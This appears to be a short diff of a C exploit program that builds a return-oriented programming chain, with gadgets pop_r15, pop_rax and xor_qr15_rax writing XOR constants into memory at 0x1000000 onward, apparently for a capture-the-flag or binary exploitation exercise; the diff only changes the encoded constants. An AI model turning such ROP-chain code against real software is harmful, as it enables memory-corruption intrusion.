@@ -128,19 +128,19 @@ int main() {
   buf[idx++] = pop_r15;
   buf[idx++] = 0x1000000;
   buf[idx++] = pop_rax;
-  buf[idx++] = 0x2f031702143e0d1f;
+  buf[idx++] = 0x1c0a0b0839151a;
   buf[idx++] = xor_qr15_rax;
   //xor and check
   buf[idx++] = pop_r15;
   buf[idx++] = 0x1000008;
   buf[idx++] = pop_rax;
-  buf[idx++] = 0x29300a3a1205073b;
+  buf[idx++] = 0x3219313b04170406;
   buf[idx++] = xor_qr15_rax;
   //xor and check
   buf[idx++] = pop_r15;
   buf[idx++] = 0x1000010;
   buf[idx++] = pop_rax;
-  buf[idx++] = 0xe2500312c062b08;
+  buf[idx++] = 0xe251f0b001c1d3a;
   buf[idx++] = xor_qr15_rax;
   //xor and check
   buf[idx++] = pop_r15;
